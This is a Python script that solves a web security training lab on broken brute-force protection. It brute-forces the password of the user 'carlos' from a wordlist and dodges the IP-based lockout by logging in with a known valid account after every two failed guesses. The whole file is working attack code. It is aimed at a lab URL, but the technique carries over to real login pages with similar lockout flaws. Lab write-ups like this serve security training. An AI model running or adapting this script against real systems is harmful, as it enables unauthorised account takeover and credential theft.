#################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 25/8/2023
#
# Lab: Broken brute-force protection, IP block
#
# Steps: 1. Brute force carlos password
#        2. After every 2 tries, login with correct
#           credentials to bypass blocking
#
#################################################################

###########
# imports
###########
import requests
import re
import time
from colorama import Fore

#############################
# Global Variables
#############################
FAILED_PASSWORDS = []
FAILED_PASSWORDS_COUNTER = 0

# change this to your lab URL
url = "https://0a1b00e4045d76eb8237443600e900d8.web-security-academy.net/login"
# change the paths to your lists
passwords = open("/home/ahmed/passwords",
                 'rt').read().splitlines()



#####################################
# Function to print in a nice format
#####################################
def print_progress(elapsed_time, fail_counter, success_counter, total_counts, text):
    print(Fore.YELLOW + "Elapsed: " + Fore.WHITE + str(elapsed_time) + " minutes || " + Fore.RED + "Failed: " + Fore.WHITE +
          str(fail_counter) + " || " + Fore.WHITE + f"Trying ({success_counter}/{total_counts}): " + Fore.BLUE + f"{text:50}", end='\r', flush=True)


##################################
# Function to bure force password
##################################
def brute_force_password(start_time, url, valid_user, passwords):
    global FAILED_PASSWORDS
    global FAILED_PASSWORDS_COUNTER
    print(Fore.WHITE + "[#] Brute forcing password..")
    print(Fore.GREEN + "✅ Valid user: " + valid_user)
    total_passwords = len(passwords)  # number of all passwords
    for (index, password) in enumerate(passwords):
        if index % 2 == 0:
            data = {
                "username": "wiener",
                "password": "peter"
            }
            try:  # try to send correct creds
                response = requests.post(
                    url, data, allow_redirects=False)
                if response.status_code == 302:  # valid password
                    print(Fore.BLUE + "\nSend correct creds.. ☑️")
                else:
                    print(Fore.RED + "\n[!] Couldn't send correct creds")
            except:
                print(Fore.RED + "\n[!] Couldn't send correct creds throuhg exception")
        # calculate elapsed time
        elapsed_time = (int((time.time() - start_time) / 60))
        print_progress(elapsed_time, FAILED_PASSWORDS_COUNTER,
                       index, total_passwords, password)
        # POST data to submit
        data = {
            "username": valid_user,
            "password": password
        }
        try:  # try to login
            response = requests.post(
                url, data, allow_redirects=False, timeout=5)
            if response.status_code == 302:  # valid password
                return password
            else:
                pass
        except:
            FAILED_PASSWORDS_COUNTER += 1  # update the failed counter
            # save the failed password to try it later
            FAILED_PASSWORDS.append(password)
    None


##################################
# Function to save results
##################################
def save_results(elapsed_time, file_name, valid_user, valid_password):
    global FAILED_PASSWORDS
    global FAILED_PASSWORDS_COUNTER
    to_save = f"""
    ✅ Finished in: {elapsed_time} minutes \n\n\
    Username: {valid_user}, Password: {valid_password} \n\n\
    [!] Failed passwords count: {FAILED_PASSWORDS_COUNTER} \n\
    [!] Failed passwords: {FAILED_PASSWORDS} \n\n"""
    try:
        new_file = open(file_name, "x")
        new_file.write(to_save)
        print(Fore.YELLOW + f"Results was saved to: {file_name}")
    except:
        print(Fore.RED + "Couldn't create the file to save results")


###############################
# Starting point of the script
###############################
start_time = time.time()  # capture the time before enumeration
valid_user = "carlos"  # start the enumeration
valid_password = brute_force_password(
    start_time, url, "carlos", passwords)  # brute force his password
if valid_password != None:  # if a valid password was found
    elapsed_time = int((time.time() - start_time) /
                       60)  # calculate elapsed time
    print("")
    print(Fore.GREEN + "✅ Login successfully: " + Fore.WHITE + " username: " +
          Fore.GREEN + valid_user + Fore.WHITE + ", password: " + Fore.GREEN + valid_password)
    print(Fore.GREEN + "✅ Finished in: " +
          Fore.WHITE + str(elapsed_time) + " minutes")
    save_results(elapsed_time, "results", valid_user, valid_password)
else:  # no valid password was found
    elapsed_time = int((time.time() - start_time) /
                       60)  # calculate elapsed time
    print("")
    print(Fore.RED + "[!] Couldn't find a valid password")
    print(Fore.GREEN + "Finished in: " +
          Fore.WHITE + str(elapsed_time) + " minutes")
    save_results(elapsed_time, "results", valid_user, "")


print(Fore.RED + "Failed passwords count: " +
      Fore.WHITE + str(FAILED_PASSWORDS_COUNTER))
print(Fore.RED + "Failed passwords: " + Fore.WHITE +
      "[ " + ", ".join(FAILED_PASSWORDS) + " ]")
